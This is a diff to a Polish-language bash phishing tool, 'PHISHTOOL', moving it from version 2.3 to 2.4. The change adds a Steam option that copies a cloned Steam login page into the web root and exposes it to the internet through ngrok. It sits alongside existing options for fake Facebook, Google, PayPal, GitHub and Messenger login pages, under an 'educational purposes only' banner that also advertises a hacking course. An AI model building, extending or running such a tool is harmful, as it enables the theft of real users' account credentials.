@@ -84,18 +84,25 @@ messenger_login_page()
 	sudo rm /var/www/html/index.html
 }
 
+steam_login_page()
+{
+	echo "wybrales steam'a";
+	sudo rm /var/www/html/index.html
+	sudo cp steam/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
 
 exit_work()
 {
 	exit
 }
 
-figlet PHISHTOOL 2.3
+figlet PHISHTOOL 2.4
 echo " ------------------------------------------------------------------------------ "
-echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.3"
+echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.4"
 echo " ------------------------------------------------------------------------------ "
 echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
-echo -e "\e[5m  KUP KURS NA WWW.EHACKING.PL \e[0m"
 echo "Wybierz opcje"
 echo "================="
 echo -e "\e[31m  [1] Facebook\e[0m"
@@ -107,6 +114,7 @@ echo -e "\e[31m  [6] Github\e[0m"
 echo -e "\e[31m  [7] Google\e[0m"
 echo -e "\e[31m  [8] PayPal\e[0m"
 echo -e "\e[31m  [9] Messenger\e[0m"
+echo -e "\e[31m  [10] Steam\e[0m"
 echo -e "\e[92m  [11] EXIT \e[0m"
 echo "================="
 
@@ -126,8 +134,9 @@ case "$opcja" in
   "7") google_login_page ;;
   "8") paypal_login_page ;;
   "9") messenger_login_page ;;
+  "10") steam_login_page ;;
   "11") exit_work ;;
-  *)  ./run.sh
+  *)  clear && ./run.sh
   
 esac
 
